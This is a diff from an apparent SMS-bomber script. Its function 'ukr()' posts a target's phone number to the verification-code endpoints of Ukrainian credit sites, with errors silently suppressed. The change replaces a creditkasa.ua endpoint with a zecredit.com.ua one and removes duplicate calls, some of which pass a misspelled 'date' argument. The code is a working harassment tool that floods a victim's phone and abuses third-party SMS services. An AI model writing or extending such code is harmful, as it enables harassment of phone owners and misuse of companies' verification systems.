@@ -53,21 +53,10 @@ def ukr():
                 except:
                         pass
                 try:
-                         requests.post("https://api.creditkasa.ua/public/auth/sendAcceptanceCode ", json={"phone": "+" + number}, headers=headers)
+                         requests.post("https://back.zecredit.com.ua/v1/api/rest/verifications", json={"phone": number}, headers=headers)
                 except:
                         pass
-                try:
-                         requests.post("https://api.creditkasa.ua/public/auth/sendAcceptanceCode ", json={"phone": number}, headers=headers)
-                except:
-                        pass
-                try:
-                         requests.post("https://api.creditkasa.ua/public/auth/sendAcceptanceCode ", date={"phone": "+" + number}, headers=headers)
-                except:
-                        pass
-                try:
-                         requests.post("https://api.creditkasa.ua/public/auth/sendAcceptanceCode ", date={"phone": number}, headers=headers)
-                except:
-                        pass
+
 
 
 
